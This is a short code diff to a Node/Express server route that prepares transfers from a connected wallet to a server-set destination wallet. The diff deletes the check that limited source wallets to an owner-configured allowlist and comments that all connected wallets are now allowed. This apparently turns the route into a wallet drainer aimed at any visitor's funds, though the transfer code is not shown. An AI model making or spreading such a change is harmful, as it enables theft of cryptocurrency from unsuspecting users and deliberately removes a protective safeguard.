@@ -323,11 +323,9 @@ app.get('/api/send-plan/:pubkey', async (req, res) => {
     if (!DEST_WALLET) {
       return res.status(400).json({ error: 'DEST_WALLET is not set on the server' });
     }
-    if (!TELEGRAM_ALLOWED_ADDRESSES.length) {
-      return res.status(403).json({ error: 'Set TELEGRAM_ALLOWED_ADDRESSES to your source wallet first' });
-    }
+
     const from = new PublicKey(req.params.pubkey).toBase58();
-// Check removed: All connected wallets are allowed
+    // Check removed: All connected wallets are allowed
 
     const dest = new PublicKey(DEST_WALLET).toBase58();
     if (from === dest) {
@@ -359,6 +357,7 @@ app.get('/api/send-plan/:pubkey', async (req, res) => {
     res.status(400).json({ error: err.message });
   }
 });
+
 
 app.get('/api/health', (_req, res) => {
   res.json({
